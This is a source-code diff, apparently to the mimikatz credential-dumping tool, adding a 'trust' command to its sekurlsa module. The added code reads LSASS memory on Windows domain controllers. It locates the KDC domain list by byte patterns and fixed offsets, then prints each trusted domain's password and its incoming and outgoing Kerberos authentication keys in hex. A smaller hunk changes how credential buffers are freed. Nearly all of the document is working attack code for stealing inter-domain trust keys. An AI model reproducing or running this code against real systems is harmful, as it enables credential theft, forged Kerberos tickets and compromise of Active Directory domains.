@@ -19,6 +19,9 @@ const KUHL_M_C kuhl_m_c_sekurlsa[] = {
 
 	{kuhl_m_sekurlsa_pth,		L"pth",				L"Pass-the-hash"},
 	{kuhl_m_sekurlsa_krbtgt,	L"krbtgt",			L"krbtgt!"},
+#ifdef _M_X64
+	{kuhl_m_sekurlsa_trust,		L"trust",			L"trust!"},
+#endif
 	{kuhl_m_sekurlsa_kerberos_tickets,	L"tickets",	L"List Kerberos tickets"},
 	{kuhl_m_sekurlsa_kerberos_keys,		L"ekeys",	L"List Kerberos Encryption Keys"},
 	{kuhl_m_sekurlsa_dpapi,				L"dpapi",	L"List Cached MasterKeys"},
@@ -516,6 +519,118 @@ void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, PCWSTR prefix)
 	}
 }
 
+#ifdef _M_X64
+BYTE PTRN_W2K8R2_DomainList[]	= {0xf3, 0x0f, 0x6f, 0x6c, 0x24, 0x30, 0xf3, 0x0f, 0x7f, 0x2d};
+BYTE PTRN_W2K12R2_DomainList[]	= {0x0f, 0x10, 0x45, 0xf0, 0x66, 0x48, 0x0f, 0x7e, 0xc0, 0x0f, 0x11, 0x05};
+KULL_M_PATCH_GENERIC DomainListReferences[] = {
+	{KULL_M_WIN_BUILD_7,	{sizeof(PTRN_W2K8R2_DomainList),		PTRN_W2K8R2_DomainList},	{0, NULL}, {10}},
+	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_W2K12R2_DomainList),	PTRN_W2K12R2_DomainList},	{0, NULL}, {12}},
+};
+NTSTATUS kuhl_m_sekurlsa_trust(int argc, wchar_t * argv[])
+{
+	NTSTATUS status = kuhl_m_sekurlsa_acquireLSA();
+	PVOID buffer;
+	KDC_DOMAIN_INFO domainInfo;
+	KULL_M_MEMORY_HANDLE  hBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
+	KULL_M_MEMORY_ADDRESS aLsass = {NULL, cLsass.hLsassMem}, data = {&buffer, &hBuffer}, aBuffer = {&domainInfo, &hBuffer};
+
+	if(cLsass.osContext.BuildNumber >= KULL_M_WIN_BUILD_7)
+	{
+		if(NT_SUCCESS(status))
+		{
+			if(kuhl_m_sekurlsa_kdcsvc_package.Module.isPresent)
+			{
+				if(kuhl_m_sekurlsa_utils_search_generic(&cLsass, &kuhl_m_sekurlsa_kdcsvc_package.Module, DomainListReferences, ARRAYSIZE(DomainListReferences), &aLsass.address, NULL, NULL))
+				{
+					aLsass.address = (PBYTE) kuhl_m_sekurlsa_kdcsvc_package.Module.Informations.DllBase.address + ((cLsass.osContext.MinorVersion < 3) ? 0x64D40 : 0x7F600);
+					if(kull_m_memory_copy(&data, &aLsass, sizeof(PVOID)))
+					{
+						data.address = buffer;
+						data.hMemory = cLsass.hLsassMem;
+						while(data.address != aLsass.address)
+						{
+							if(kull_m_memory_copy(&aBuffer, &data, sizeof(KDC_DOMAIN_INFO)))
+							{
+								kuhl_m_sekurlsa_trust_domaininfo(&domainInfo);
+								data.address = domainInfo.list.Flink;
+							}
+							else break;
+						}
+					}
+				}
+			}
+			else PRINT_ERROR(L"KDC service not in LSASS memory\n");
+		}
+	}
+	else PRINT_ERROR(L"Only for >= 2008r2\n");
+	return status;
+}
+
+void kuhl_m_sekurlsa_trust_domainkeys(struct _KDC_DOMAIN_KEYS_INFO * keysInfo, PCWSTR prefix)
+{
+	KULL_M_MEMORY_HANDLE  hBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
+	KULL_M_MEMORY_ADDRESS aLsass = {keysInfo->keys, cLsass.hLsassMem}, aData = {NULL, &hBuffer};
+	DWORD i;
+	PKDC_DOMAIN_KEYS domainKeys;
+
+	if((keysInfo->keysSize && keysInfo->keys) || (keysInfo->password.Length && keysInfo->password.Buffer))
+	{
+		kprintf(L"\n  [%s]", prefix);
+		if(kull_m_string_getUnicodeString(&keysInfo->password, cLsass.hLsassMem))
+		{
+			kprintf(L" from: ");
+			if(kull_m_string_suspectUnicodeString(&keysInfo->password))
+				kprintf(L"%wZ", &keysInfo->password);
+			else kull_m_string_wprintf_hex(keysInfo->password.Buffer, keysInfo->password.Length, 1);
+			LocalFree(keysInfo->password.Buffer);
+		}
+		kprintf(L"\n");
+
+		if(keysInfo->keysSize && keysInfo->keys)
+		{
+			if(domainKeys = (PKDC_DOMAIN_KEYS) LocalAlloc(LPTR, keysInfo->keysSize))
+			{
+				aData.address = domainKeys;
+				if(kull_m_memory_copy(&aData, &aLsass, keysInfo->keysSize))	
+				{
+					for(i = 0; i < domainKeys->nbKeys; i++)
+					{
+						kprintf(L"\t* %s : ", kuhl_m_kerberos_ticket_etype(domainKeys->keys[i].type));
+						kull_m_string_wprintf_hex((PBYTE) domainKeys + domainKeys->keys[i].offset, domainKeys->keys[i].size, 0);
+						kprintf(L"\n");
+					}
+				}
+				LocalFree(domainKeys);
+			}
+		}
+	}
+}
+
+void kuhl_m_sekurlsa_trust_domaininfo(struct _KDC_DOMAIN_INFO * info)
+{
+	if(kull_m_string_getUnicodeString(&info->FullDomainName, cLsass.hLsassMem))
+	{
+		if(kull_m_string_getUnicodeString(&info->NetBiosName, cLsass.hLsassMem))
+		{
+			kprintf(L"\nDomain: %wZ (%wZ", &info->FullDomainName, &info->NetBiosName);
+			if(kuhl_m_sekurlsa_utils_getSid(&info->DomainSid, cLsass.hLsassMem))
+			{
+				kprintf(L" / "); kull_m_string_displaySID(info->DomainSid);
+				LocalFree(info->DomainSid);
+			}
+			kprintf(L")\n");
+			//kprintf(L"%u / %u / %u / %u - %p - %u\n", info->unk1, info->unk2, info->unk3, info->unk4, info->unk5, info->unk6);
+			kuhl_m_sekurlsa_trust_domainkeys(&info->IncomingAuthenticationKeys, L"  In ");
+			kuhl_m_sekurlsa_trust_domainkeys(&info->OutgoingAuthenticationKeys, L" Out ");
+			kuhl_m_sekurlsa_trust_domainkeys(&info->IncomingPreviousAuthenticationKeys, L" In-1");
+			kuhl_m_sekurlsa_trust_domainkeys(&info->OutgoingPreviousAuthenticationKeys, L"Out-1");
+			LocalFree(info->NetBiosName.Buffer);
+		}
+		LocalFree(info->FullDomainName.Buffer);
+	}
+}
+#endif
+
 NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 {
 	BYTE ntlm[LM_NTLM_HASH_LENGTH], aes128key[AES_128_KEY_LENGTH], aes256key[AES_256_KEY_LENGTH];
@@ -791,9 +906,12 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 					else kull_m_string_wprintf_hex(password->Buffer, password->Length, 1);
 				}
 
-				LocalFree(mesCreds->UserName.Buffer);
-				LocalFree(mesCreds->Domaine.Buffer);
-				LocalFree(mesCreds->Password.Buffer);
+				if(username)
+					LocalFree(username->Buffer);
+				if(domain)
+					LocalFree(domain->Buffer);
+				if(password)
+					LocalFree(password->Buffer);
 			}
 		}
 		if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NEWLINE)
